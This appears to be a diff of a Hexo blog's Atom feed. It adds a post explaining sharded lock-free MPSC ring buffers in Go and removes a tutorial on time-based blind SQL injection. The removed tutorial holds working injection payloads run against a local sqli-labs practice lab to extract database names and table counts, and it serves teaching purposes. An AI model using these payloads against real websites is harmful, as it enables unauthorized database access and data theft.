@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-04-28T04:31:35.903Z</updated>
+  <updated>2025-08-16T14:12:55.798Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Sharded Lock-Free MPSC Ring Buffers in Golang</title>
+    <link href="http://example.com/2025/08/16/Lock-Free-golang/"/>
+    <id>http://example.com/2025/08/16/Lock-Free-golang/</id>
+    <published>2025-08-16T13:56:22.000Z</published>
+    <updated>2025-08-16T14:12:55.798Z</updated>
+    
+    <content type="html"><![CDATA[<ol><li><p>Fundamental Concepts</p><ul><li><p>Ring Buffer</p><ul><li>A ring buffer (or circular buffer) is a fixed-size queue in which the write and read pointers wrap around once they reach the end of the underlying array. It is widely used in high-performance systems such as logging pipelines, network buffers, and message queues.</li></ul></li><li><p>MPSC (Multi-Producer, Single-Consumer)</p><ul><li><p>An MPSC queue allows multiple producers (writers) to insert elements concurrently, while only a single consumer (reader) retrieves elements.</p></li><li><p>Write operations must address concurrent access among producers.</p></li><li><p>Read operations are simpler, as they are performed by a single consumer thread.</p></li></ul></li><li><p>Lock-Free</p><ul><li>Instead of using traditional mutexes, lock-free structures rely on atomic operations (e.g., Compare-And-Swap, CAS) to ensure correctness under concurrency. This avoids lock contention, reducing latency and improving throughput.</li></ul></li><li><p>Sharded</p><ul><li>A sharded design partitions a large ring buffer into several smaller independent sub-buffers (shards). Producers are distributed across shards (e.g., by hashing or thread affinity), which minimizes contention. The consumer then sequentially or cyclically retrieves items from all shards.</li></ul></li></ul></li><li><p>Operating Principles</p><p> A sharded lock-free MPSC ring buffer typically operates as follows:</p><ul><li><p>Initialization</p><ul><li><p>The total buffer capacity is divided into N shards (e.g., 8 sub-buffers).</p></li><li><p>Each shard itself is implemented as a lock-free MPSC ring buffer.</p></li></ul></li><li><p>Producer Writes (Concurrent)</p><ul><li><p>Each producer selects a shard based on a hash function, producer ID, or randomized strategy.</p></li><li><p>The producer atomically advances the write pointer in that shard using CAS and writes its data.</p></li><li><p>Because writes are distributed across shards, contention is significantly reduced.</p></li></ul></li><li><p>Consumer Reads (Single Thread)</p><ul><li><p>The consumer iterates over all shards, checking each for available entries.</p></li><li><p>Data is retrieved by advancing the shard’s read pointer.</p></li><li><p>As only one consumer exists, no synchronization overhead is required for reading.</p></li></ul></li></ul></li><li><p>Motivation for Sharding</p><ul><li><p>Challenge with Conventional MPSC Buffers</p><ul><li>In a non-sharded MPSC buffer, all producers compete on a single shared write pointer, resulting in substantial contention under high concurrency.</li></ul></li><li><p>Benefits of Sharding</p><ul><li><p>Each shard has fewer competing producers, reducing contention on its write pointer.</p></li><li><p>The single consumer can still process data deterministically by scanning all shards.</p></li><li><p>Performance gains are particularly evident when the number of producers is large relative to the consumer.</p></li></ul></li></ul></li><li><p>Application Scenarios</p><ul><li><p>High-performance logging systems (multiple threads writing logs, one thread persisting to storage).</p></li><li><p>Network servers (multiple connections producing packets, one thread aggregating and processing them).</p></li><li><p>Data acquisition systems (multiple sensors producing input, one thread consuming for analysis).</p></li></ul></li><li><p>Implementation Notes in Golang</p><ul><li><p>In Go, the sync&#x2F;atomic package is typically used for lock-free synchronization.<br> Key implementation aspects include:</p></li><li><p>Write Operation</p></li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idx := atomic.AddUint64(&amp;shard.writePos, <span class="number">1</span>) - <span class="number">1</span></span><br><span class="line">buffer[idx % shard.size] = value</span><br></pre></td></tr></table></figure><ul><li>Read Operation (single-threaded, no CAS required)</li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> shard.readPos &lt; shard.writePos &#123;</span><br><span class="line">    val := buffer[shard.readPos % shard.size]</span><br><span class="line">    shard.readPos++</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Shard Selection</li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shardID := hash(producerID) % numShards</span><br><span class="line">shard := shards[shardID]</span><br></pre></td></tr></table></figure><ul><li>Consumer Loop</li></ul> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, shard := <span class="keyword">range</span> shards &#123;</span><br><span class="line">        <span class="keyword">if</span> val, ok := shard.TryRead(); ok &#123;</span><br><span class="line">            process(val)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Advantages and Limitations</p><ul><li><p>Advantages</p><ul><li><p>Lock-free design avoids mutex contention.</p></li><li><p>Sharding reduces producer contention and increases throughput.</p></li><li><p>Single-consumer semantics simplify design and maintain order within each shard.</p></li></ul></li><li><p>Limitations</p><ul><li><p>The consumer must poll multiple shards, which may increase latency with many shards.</p></li><li><p>Buffer utilization may be uneven if some shards are heavily loaded while others remain idle.</p></li><li><p>The design does not extend naturally to multiple consumers.</p></li></ul></li></ul></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Fundamental Concepts&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Ring Buffer&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A ring buffer (or circular buffer) is a fixed-size queue in which </summary>
+      
+    
+    
+    
+    <category term="Go -Sharded Lock-Free MPSC Ring Buffers" scheme="http://example.com/categories/Go-Sharded-Lock-Free-MPSC-Ring-Buffers/"/>
+    
+    
+    <category term="linux" scheme="http://example.com/tags/linux/"/>
+    
+    <category term="Go" scheme="http://example.com/tags/Go/"/>
+    
+  </entry>
   
   <entry>
     <title>FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary code (CVE-2025-29306) POC</title>
@@ -528,34 +559,6 @@ An issue in FoxCMS v.1.2.5 allows a remote attacker to execute arbitrary </summa
     <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
     
     <category term="DNS Log Blind SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Time-Based Blind SQL Injection</title>
-    <link href="http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/"/>
-    <id>http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/</id>
-    <published>2016-10-29T02:31:42.000Z</published>
-    <updated>2023-10-19T00:37:49.750Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Time-Based-Blind-SQL-Injection-Steps"><a href="#Time-Based-Blind-SQL-Injection-Steps" class="headerlink" title="Time-Based Blind SQL Injection Steps:"></a>Time-Based Blind SQL Injection Steps:</h1><ol><li>First, check if an injection vulnerability exists.</li><li>Next, determine the injection type: character-based, numeric-based, or search-based.</li><li>Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and 1=2 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and sleep(5) %23  </span><br></pre></td></tr></table></figure> Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection.</li><li>Start by obtaining the length of the database name:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)</span><br><span class="line">?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay)</span><br></pre></td></tr></table></figure>This indicates that the database name has a length of 8 characters.</li><li>Proceed to retrieve the database name character by character:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23</span><br></pre></td></tr></table></figure>These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name.</li></ol><h1 id="Example-of-Time-Based-Blind-SQL-Injection-Operation"><a href="#Example-of-Time-Based-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Time-Based Blind SQL Injection Operation:"></a>Example of Time-Based Blind SQL Injection Operation:</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1\ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23  响应的比较快,说明不是数字型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;Time-Based-Blind-SQL-Injection-Steps&quot;&gt;&lt;a href=&quot;#Time-Based-Blind-SQL-Injection-Steps&quot; class=&quot;headerlink&quot; title=&quot;Time-Based Blind SQL</summary>
-      
-    
-    
-    
-    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
-    
-    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
-    
-    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
-    
-    <category term="Time-Based Blind SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/"/>
     
     
   </entry>
